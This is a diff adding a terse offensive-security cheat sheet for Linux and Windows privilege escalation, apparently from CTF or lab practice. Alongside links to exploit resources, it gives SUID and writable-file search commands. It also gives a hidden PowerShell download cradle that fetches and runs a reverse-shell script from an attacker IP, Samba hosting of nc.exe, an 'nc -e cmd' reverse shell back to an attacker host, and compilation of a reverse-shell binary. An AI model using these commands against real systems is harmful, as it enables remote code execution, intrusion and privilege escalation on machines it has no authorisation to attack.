@@ -1,0 +1,105 @@
+General Resource
+https://book.hacktricks.xyz/
+
+Linux
+Priv Escalation
+https://github.com/Anon-Exploiter/SUID3NUM
+https://fieldraccoon.github.io/posts/Linuxprivesc/
+https://guif.re/linuxeop
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://gtfobins.github.io/
+https://amandaszampias.blogspot.com/2020/11/linux-privilege-escalation-jutsus.html
+https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+
+Automation scripts for post exploitation
+https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+Exploiting Cron Job Misconfigurations
+https://tbhaxor.com/exploiting-the-cron-jobs-misconfigurations2/
+
+Container Breakout
+https://tbhaxor.com/container-host-breakout-part-2/
+
+Find all files that our user can read
+find /  -path /sys -prune -o -path /proc -prune -o -type f -user www-data 2>/dev/null
+
+Find all files that are modified and look for any that SUID or SGID have been changed
+find -newermt "2020-12-05" ! -newermt "2020-12-06" -type f 2>/dev/null | find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+find -L / -type f -newermt "2020-12-01" ! -newermt "2020-12-01" 2>/dev/null > /tmp/whateveryouwannanameit.txt
+
+Check for SUID's; can also check the /opt directory; look for newer files
+find / -perm -u=s -type f 2>/dev/null | xargs ls -l
+
+Check for SUID's on older kernals
+find / -perm -4000 -type f 2>/dev/null | xargs ls -l
+
+Find all files that are owned by root that our user can write to
+find / -path /sys -prune -o -path /proc -prune -o -writable -type f -user root  -exec ls -ld '{}' ';' 2>/dev/null
+
+Find world writeable that are not owned by your user
+find / -path /sys -prune -o -path /proc -prune -o -writable ! -user `whoami` -type f -exec ls -la {} \; 2>/dev/null
+
+Find files that have the string "pass" inside of them
+Grep -irl "pass" * 2>/dev/null | grep whatever or just look at all of it
+
+Compile .C file
+Gcc .c_file -o out_file
+
+Verify what C or Binary is doing
+Strings binary_name
+
+Windows
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
+Download files with Powershell
+Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c IEX(New-Object Net.WebClient).downloadString('http://192.168.122.209:8000/Invoke-PowershellTcp.ps1')
+
+Download files from CMD
+https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil
+
+Host files via Samba on attacker machine and run in victim's memory
+Systemctl enable smbd.service
+Nano /etc/samba/smb.con
+[data]
+   comment = Exploit
+   path = /srv/smb/
+   browsable = yes
+   guest ok = yes
+   create mask = 0600
+Systemctl restart smbd.service
+Smbmap -H 127.0.0.1 -R (can also use this to verify the share exists and that files are being hosted
+Sudo cp /usr/share/windows-binaries/nc.exe /srv/smb/
+From Attack
+Apt install rlwrap
+Rlwrap nc -lvp 4444
+
+From Victim
+\\192.168.1.110\data\nc.exe 192.168.1.110 4444 -e cmd
+
+Find files
+dir root.txt /s /p
+
+Abusing Tokens
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
+git clone https://github.com/PowerShellMafia/PowerSploit.git -b dev
+https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
+https://github.com/rasta-mouse/Sherlock
+.NET verification = reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+C# compiler on windows = dir /s %WINDIR%\CSC.EXE
+Compile reverse shell for windows = C:\windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:exe /out:c:\windows\temp\rev.exe "c:\HP Universal Print Driver\rev.cs"
+https://github.com/carlospolop/winPE/tree/master/binaries
+https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges
+https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/
+https://github.com/dievus/printspoofer
+
+DLL Exploit
+https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability/
+
+Windows Shells
+https://book.hacktricks.xyz/shells/shells/windows
+
+
+
+
